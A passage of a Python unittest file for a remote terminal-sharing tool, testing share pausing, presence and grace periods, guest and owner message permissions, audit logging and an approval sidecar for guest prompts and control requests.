                self.assertIsNone(harness.host.control_holder("pane-1"),
                                  "a paused holder keeps nothing")

                for message in ({"t": "keys", "pane": "pane-1", "bytes": "eA"},
                                {"t": "compose", "pane": "pane-1", "text": "hello"},
                                {"t": "control_request", "pane": "pane-1"}):
                    await client.send(message)
                    with self.assertRaises(wire.WireError, msg=message["t"]) as caught:
                        await client.expect("never", timeout=5)
                    self.assertEqual(caught.exception.code, "paused", message["t"])
                self.assertEqual(harness.source.typed, [])
                self.assertEqual(harness.source.composed, [])

                harness.host.share_pause("", False)
                back = await client.expect("share_state", timeout=10)
                self.assertFalse(back["paused"])
                await client.send({"t": "compose", "pane": "pane-1", "text": "hello again"})
                await client.expect("prompt_decided", timeout=10)
                await harness.settle()
                self.assertEqual(len(harness.source.composed), 1)
                self.assertIn("share_pause", harness.audit_kinds())
                await client.close()
        run(main())

    def test_the_screen_keeps_streaming_while_paused(self):
        async def main():
            async with Harness() as harness:
                client, _ = await harness.guest()
                harness.host.share_pause("pane-1", True)
                await client.expect("share_state", timeout=10)
                harness.source._screen_callbacks[0](
                    "pane-1", {"t": "screen_diff", "pane": "pane-1", "cursor": {},
                               "lines": [{"row": 0, "segs": [["still watching", 7, 0, 0]]}]})
                frame = await client.expect("screen_diff", timeout=10)
                self.assertIn("still watching", json.dumps(frame))
                await client.close()
        run(main())

    def test_present_only_pauses_after_the_grace_period_and_not_before(self):
        async def main():
            async with Harness() as harness:
                harness.host.set_share_options("pane-1", present_only=True)
                client, joined = await harness.guest()
                await client.send({"t": "control_request", "pane": "pane-1"})
                await client.expect("control", timeout=10)

                harness.host.window_active(False)
                harness.clock[0] += host_mod.PRESENCE_GRACE / 2
                harness.host.expire_pending()
                await harness.settle()
                self.assertEqual(harness.host.control_holder("pane-1"), joined.participant,
                                 "alt-tabbing for a moment does not drop the driver")
                await client.send({"t": "keys", "pane": "pane-1", "bytes": "eA"})
                await harness.settle()
                self.assertEqual(len(harness.source.typed), 1)

                harness.tick(host_mod.PRESENCE_GRACE)
                state = await client.expect("share_state", timeout=10)
                self.assertTrue(state["paused"])
                self.assertEqual(state["reason"], "away")
                self.assertIsNone(harness.host.control_holder("pane-1"))
                await client.send({"t": "keys", "pane": "pane-1", "bytes": "eA"})
                with self.assertRaises(wire.WireError) as caught:
                    await client.expect("never", timeout=5)
                self.assertEqual(caught.exception.code, "paused")

                harness.host.window_active(True)
                back = await client.expect("share_state", timeout=10)
                self.assertFalse(back["paused"])
                await client.close()
        run(main())

    def test_without_present_only_an_unfocused_window_changes_nothing(self):
        async def main():
            async with Harness() as harness:
                client, joined = await harness.guest()
                await client.send({"t": "control_request", "pane": "pane-1"})
                await client.expect("control", timeout=10)
                harness.host.window_active(False)
                harness.tick(host_mod.PRESENCE_GRACE * 3)
                self.assertEqual(harness.host.control_holder("pane-1"), joined.participant)
                self.assertFalse(harness.host.share_state("pane-1")[0])
                await client.close()
        run(main())

    def test_the_presence_signal_is_the_one_the_notifications_use(self):
        async def main():
            async with Harness() as harness:
                harness.host.window_active(False)
                self.assertFalse(harness.host.notifier.active)
                harness.host.window_active(True)
                self.assertTrue(harness.host.notifier.active, "one signal, two readers")
        run(main())


# ---- presence ------------------------------------------------------------------------------------

class JoinTests(unittest.TestCase):
    def test_admitted_says_what_this_desktop_can_do(self):
        """`admitted` carries the same `features` list `welcome` does.

        A guest admitted for the first time would otherwise have to assume a screen and
        scrollback exist until their first reconnect told them otherwise.
        """
        async def main():
            async with Harness() as harness:
                _, url = await harness.invite(role=wire.EDITOR)
                link = pairing.parse_invite_url(url)
                client = client_mod.Client(harness.base)
                client.socket = await ws.connect(client._url(room=link["room"]))
                await client._handshake(link["desktop_public"])
                await client.send({"t": "knock", "invite": pairing.b64(link["secret"]),
                                   "name": "alice", "platform": "Chrome"})
                await client.expect("knock_pending", timeout=10)
                admitted = await client.expect("admitted", timeout=30)
                self.assertEqual(admitted["features"], ["panes", "agent", "screen", "history"])
                self.assertEqual(admitted["features"], harness.host.guest_features())
                self.assertNotIn("capability", admitted)
                self.assertNotIn("password_entry", admitted)
                await client.close()
        run(main())


class PresenceTests(unittest.TestCase):
    def test_a_join_and_a_leave_reach_the_other_guest(self):
        async def main():
            async with Harness() as harness:
                alice, alice_id = await harness.guest(name="alice")
                await drain(alice, "participants")
                bob, bob_id = await harness.guest(name="bob")
                told = (await drain(alice, "participants"))[-1]
                self.assertEqual(sorted(item["name"] for item in told["items"]),
                                 ["alice", "bob"])
                self.assertTrue(all(item["online"] for item in told["items"]))
                mine = next(item for item in told["items"] if item["id"] == alice_id.participant)
                self.assertTrue(mine["you"])

                await bob.close()
                for _ in range(100):
                    await asyncio.sleep(0.05)
                    people = harness.host.participants_on("pane-1")
                    if not any(item["online"] and item["id"] == bob_id.participant
                               for item in people):
                        break
                told = (await drain(alice, "participants"))[-1]
                offline = next(item for item in told["items"]
                               if item["id"] == bob_id.participant)
                self.assertFalse(offline["online"])
                await alice.close()
        run(main())

    def test_a_role_change_fans_out(self):
        async def main():
            async with Harness() as harness:
                alice, alice_id = await harness.guest(name="alice", role=wire.VIEWER)
                await drain(alice, "participants")
                await harness.host.role_set(alice_id.participant, wire.EDITOR)
                told = (await drain(alice, "participants"))[-1]
                self.assertEqual(told["items"][0]["role"], "editor")
                await alice.close()
        run(main())

    def test_a_guest_is_told_the_state_of_their_pane_when_they_arrive(self):
        """Presence, the keyboard and whether typing is on — before they touch anything."""
        async def main():
            async with Harness() as harness:
                harness.host.share_pause("pane-1", True)
                _, url = await harness.invite(role=wire.EDITOR)
                client = client_mod.Client(harness.base)
                await client.knock(url, name="alice", platform="Chrome")
                await client.expect("panes", timeout=10)
                # All three arrive; a fan-out and a direct send are not ordered against each
                # other, so this collects them rather than pinning the sequence.
                seen: dict[str, dict] = {}
                while not {"participants", "control", "share_state"} <= set(seen):
                    message = await asyncio.wait_for(client.inbox.get(), 10)
                    seen.setdefault(message["t"], message)
                people, control, state = (seen["participants"], seen["control"],
                                          seen["share_state"])
                self.assertEqual([item["name"] for item in people["items"]], ["alice"])
                self.assertEqual(control["holder"], "owner")
                self.assertTrue(state["paused"])
                self.assertEqual(state["reason"], "owner")
                await client.close()
        run(main())


# ---- the tables ------------------------------------------------------------------------------------

class WireTableTests(unittest.TestCase):
    def test_the_new_types_are_desktop_to_client(self):
        for kind in ("prompt_decided", "control", "control_pending", "share_state",
                     "participants", "prompt_pending"):
            self.assertIn(kind, wire.SERVER_TYPES, kind)
            self.assertNotIn(kind, wire.CLIENT_TYPES, kind)
            self.assertNotIn(kind, wire.GUEST_TYPES, kind)

    def test_nothing_new_is_accepted_from_a_client(self):
        """10.3 names `control_request` and `control_release`, which section 6.6 already had.
        Handing control back, pausing and the per-share switches are the owner's, on the desktop:
        the same message over the wire is refused however the device is paired."""
        self.assertEqual(sorted(set(wire.GUEST_TYPES) - set(wire.CLIENT_TYPES)), [])
        for kind in ("control_take", "control_revoke", "share_options", "share_pause",
                     "control_answer", "prompt_answer"):
            self.assertIn(kind, wire.OWNER_ONLY, kind)
            self.assertIn(kind, wire.NEVER_FROM_CLIENT, kind)
            self.assertNotIn(kind, wire.CLIENT_TYPES, kind)

    def test_every_type_a_guest_may_be_sent_is_a_server_type(self):
        self.assertEqual(sorted(wire.GUEST_SERVER_TYPES - wire.SERVER_TYPES), [])

    def test_a_device_only_message_is_never_sent_to_a_guest(self):
        for kind in ("paired", "revoked", "push_state", "transport_switched"):
            self.assertFalse(wire.may_send_to_guest(kind), kind)

    def test_an_unclassified_server_message_never_reaches_a_guest(self):
        """The rule that makes the next desktop→client type somebody adds safe by default."""
        async def main():
            async with Harness() as harness:
                device, _ = await harness.owner_device()
                client, _ = await harness.guest()
                invented = {"t": "pane_state", "pane": "pane-1",
                            "detail": "the owner's model choices and queue text"}
                for channel in list(harness.host.channels.values()):
                    await channel.send(invented)
                with self.assertRaises(asyncio.TimeoutError):
                    await client.expect("pane_state", timeout=2)
                reached = await device.expect("pane_state", timeout=5)
                self.assertEqual(reached["pane"], "pane-1")
                await client.close()
                await device.close()
        run(main())


# ---- the audit log ---------------------------------------------------------------------------------

class AuditTests(unittest.TestCase):
    def test_every_kind_of_section_10_6_is_written_and_names_the_participant(self):
        async def main():
            async with Harness() as harness:
                client, joined = await harness.guest()
                await client.send({"t": "control_request", "pane": "pane-1"})
                await client.expect("control", timeout=10)
                await client.send({"t": "keys", "pane": "pane-1", "bytes": "eA"})
                await client.send({"t": "line", "pane": "pane-1", "text": "make test"})
                await client.send({"t": "paste", "pane": "pane-1", "text": "two words"})
                await client.send({"t": "compose", "pane": "pane-1", "text": "please rebase"})
                await client.expect("prompt_decided", timeout=10)
                harness.host.take_control("pane-1")
                harness.host.set_share_options("pane-1", present_only=True)
                harness.host.share_pause("pane-1", True)
                await harness.settle()

                lines = harness.audit_lines()
                kinds = [line["kind"] for line in lines]
                for kind in ("control_request", "control_grant", "keys", "line", "paste",
                             "guest_prompt", "prompt_decided", "control_take", "share_options",
                             "share_pause"):
                    self.assertIn(kind, kinds, kind)
                for kind in ("control_request", "control_grant", "keys", "line", "paste",
                             "guest_prompt", "prompt_decided"):
                    entry = next(line for line in lines if line["kind"] == kind)
                    self.assertEqual(entry.get("participant"), joined.participant, kind)
                keys = next(line for line in lines if line["kind"] == "keys")
                self.assertEqual(keys["bytes"], 1)
                self.assertNotIn("text", keys, "raw keys are a byte count, never their bytes")
                paste = next(line for line in lines if line["kind"] == "paste")
                self.assertEqual(paste["bytes"], len("two words"))
                self.assertNotIn("text", paste)
                line = next(entry for entry in lines if entry["kind"] == "line")
                self.assertEqual(line["text"], "make test")
                await client.close()
        run(main())

    def test_a_devices_input_is_recorded_as_a_device(self):
        async def main():
            async with Harness() as harness:
                device, record = await harness.owner_device()
                await device.send({"t": "line", "pane": "pane-1", "text": "whoami"})
                await harness.settle()
                entry = next(line for line in harness.audit_lines() if line["kind"] == "line")
                self.assertEqual(entry["device"], record.device_id)
                self.assertNotIn("participant", entry)
                await device.close()
        run(main())


# ---- the sidecar the desktop UI talks to -----------------------------------------------------------

class SidecarTests(unittest.TestCase):
    """Section 10.5 as line JSON: the hub is real, the GUI is a list of emitted lines."""

    async def sidecar_for(self, harness):
        from remote import gui_host
        sidecar = gui_host.Sidecar()
        self.emitted: list[dict] = []
        sidecar.emit = self.emitted.append
        sidecar.host = harness.host
        sidecar.devices = harness.devices
        harness.host.prompt_approver = sidecar.prompt
        harness.host.control_approver = sidecar.control
        harness.host.on_control(lambda pane, holder, name: sidecar.emit(
            {"t": "control", "pane": pane, "holder": holder, "name": name}))
        harness.host.on_share_state(lambda pane, paused, reason: sidecar.emit(
            {"t": "share_state", "pane": pane, "paused": paused, "reason": reason}))
        return sidecar

    async def wait_for(self, kind, timeout=5.0):
        for _ in range(int(timeout / 0.02)):
            found = next((m for m in self.emitted if m["t"] == kind), None)
            if found is not None:
                return found
            await asyncio.sleep(0.02)
        raise AssertionError(f"no {kind} line reached the GUI: {self.emitted}")

    def test_a_prompt_is_asked_and_answered_over_the_stdio_line(self):
        async def main():
            async with Harness() as harness:
                sidecar = await self.sidecar_for(harness)
                client, joined = await harness.guest()
                await client.send({"t": "compose", "pane": "pane-1", "text": "please rebase"})
                ask = await self.wait_for("prompt_ask")
                self.assertEqual(ask["name"], "alice")
                self.assertEqual(ask["pane"], "pane-1")
                self.assertEqual(ask["text"], "please rebase")
                self.assertEqual(ask["participant"], joined.participant)

                await sidecar.handle({"t": "prompt_answer", "id": ask["id"], "approve": True})
                decided = await client.expect("prompt_decided", timeout=10)
                self.assertTrue(decided["approved"])
                await harness.settle()
                self.assertEqual(harness.source.composed[0]["origin_name"], "alice")
                self.assertEqual(harness.source.composed[0]["origin"],
                                 f"guest:{joined.participant}")
                await client.close()
        run(main())

    def test_a_refusal_over_the_line_stops_it(self):
        async def main():
            async with Harness() as harness:
                sidecar = await self.sidecar_for(harness)
                client, _ = await harness.guest()
                await client.send({"t": "compose", "pane": "pane-1", "text": "please rebase"})
                ask = await self.wait_for("prompt_ask")
                await sidecar.handle({"t": "prompt_answer", "id": ask["id"], "approve": False})
                decided = await client.expect("prompt_decided", timeout=10)
                self.assertFalse(decided["approved"])
                await harness.settle()
                self.assertEqual(harness.source.composed, [])
                await client.close()
        run(main())

    def test_control_is_asked_answered_and_taken_back(self):
        async def main():
            async with Harness() as harness:
                sidecar = await self.sidecar_for(harness)
                client, joined = await harness.guest()
                await client.send({"t": "control_request", "pane": "pane-1"})
                ask = await self.wait_for("control_ask")
                self.assertEqual(ask, {"t": "control_ask", "pane": "pane-1",
                                       "participant": joined.participant, "name": "alice"})
                await sidecar.handle({"t": "control_answer", "pane": "pane-1",
                                      "participant": joined.participant, "grant": True})
                told = await client.expect("control", timeout=10)
                self.assertEqual(told["holder"], f"participant:{joined.participant}")
                line = await self.wait_for("control")
                self.assertEqual(line["holder"], f"participant:{joined.participant}")

                self.emitted.clear()
                await sidecar.handle({"t": "control_take", "pane": "pane-1"})
                back = await client.expect("control", timeout=10)
                self.assertEqual(back["holder"], "owner")
                self.assertEqual((await self.wait_for("control"))["holder"], "owner")

                sidecar.report_participants()
                people = await self.wait_for("participants")
                self.assertEqual(people["items"][0]["driving"], [])
                self.assertTrue(people["items"][0]["online"])
                await client.close()
        run(main())

    def test_pause_and_the_two_switches_cross_the_line(self):
        async def main():
            async with Harness() as harness:
                sidecar = await self.sidecar_for(harness)
                client, _ = await harness.guest()
                await sidecar.handle({"t": "share_options", "pane": "pane-1",
                                      "prompts_immediate": True, "present_only": False})
                self.assertTrue(harness.host.options_for("pane-1").prompts_immediate)
                await sidecar.handle({"t": "share_pause", "pane": "pane-1", "on": True})
                state = await client.expect("share_state", timeout=10)
                self.assertTrue(state["paused"])
                self.assertEqual((await self.wait_for("share_state"))["reason"], "owner")
                await sidecar.handle({"t": "share_pause", "pane": "pane-1", "on": False})
                self.assertFalse(harness.host.share_state("pane-1")[0])
                await client.close()
        run(main())

    def test_the_window_line_feeds_the_presence_rule_and_the_notifier(self):
        async def main():
            async with Harness() as harness:
                sidecar = await self.sidecar_for(harness)
                harness.host.set_share_options("pane-1", present_only=True)
                await sidecar.handle({"t": "window_active", "active": False})
                self.assertFalse(harness.host.notifier.active)
                harness.clock[0] += host_mod.PRESENCE_GRACE + 1
                harness.host.expire_pending()
                self.assertEqual(harness.host.share_state("pane-1"), (True, "away"))
                await sidecar.handle({"t": "window_active", "active": True})
                self.assertTrue(harness.host.notifier.active)
                self.assertEqual(harness.host.share_state("pane-1"), (False, ""))
        run(main())


# ---- the terminal harness (remote/cli.py) ---------------------------------------------------------

class CliApproverTests(unittest.TestCase):
    """The owner answering at the terminal, which is how this is tried without the GUI."""

    def ask(self, approver, request):
        import contextlib as ctx
        import io
        out = io.StringIO()
        with ctx.redirect_stdout(out):
            answer = asyncio.run(approver(request))
        return answer, out.getvalue()

    def test_a_prompt_is_printed_whole_and_auto_approves(self):
        from remote import cli
        request = host_mod.PromptRequest(prompt_id="p1", participant="g1", name="alice",
                                         pane="pane-1", text="line one\nline two", when="queue")
        answer, printed = self.ask(cli.make_prompt_approver("auto"), request)
        self.assertTrue(answer)
        self.assertIn("alice", printed)
        self.assertIn("line one", printed)
        self.assertIn("line two", printed, "the whole text, never a preview")
        self.assertIn("queued", printed)

    def test_a_plan_says_so(self):
        from remote import cli
        request = host_mod.PromptRequest(prompt_id="p1", participant="g1", name="alice",
                                         pane="pane-1", text="Execute the plan abc",
                                         plan_id="abc")
        _, printed = self.ask(cli.make_prompt_approver("auto"), request)
        self.assertIn("plan abc", printed)

    def test_control_names_the_pane_and_says_how_to_take_it_back(self):
        from remote import cli
        request = host_mod.ControlRequest(pane="pane-1", participant="g1", name="alice")
        answer, printed = self.ask(cli.make_control_approver("auto"), request)
        self.assertTrue(answer)
        self.assertIn("alice", printed)
        self.assertIn("pane-1", printed)
        self.assertIn("Typing here takes it", printed)

    def test_the_local_attachment_takes_control_back_by_typing(self):
        """`remote.cli share` has no GUI to send `control_take`, so the attachment's own keys
        are the owner's physical keystroke (section 10.3)."""
        from remote import attach as attach_mod

        class Source:
            panes = {"pane-1": object()}

            async def _write(self, pane, message):
                self.wrote = message

        taken = []

        async def main():
            source = Source()
            attachment = attach_mod.Attachment.__new__(attach_mod.Attachment)
            attachment.source = source
            attachment.pane_id = "pane-1"
            attachment.on_input = taken.append
            await attach_mod.Attachment._send(attachment, b"x")

        asyncio.run(main())
        self.assertEqual(taken, ["pane-1"])


if __name__ == "__main__":
    unittest.main()
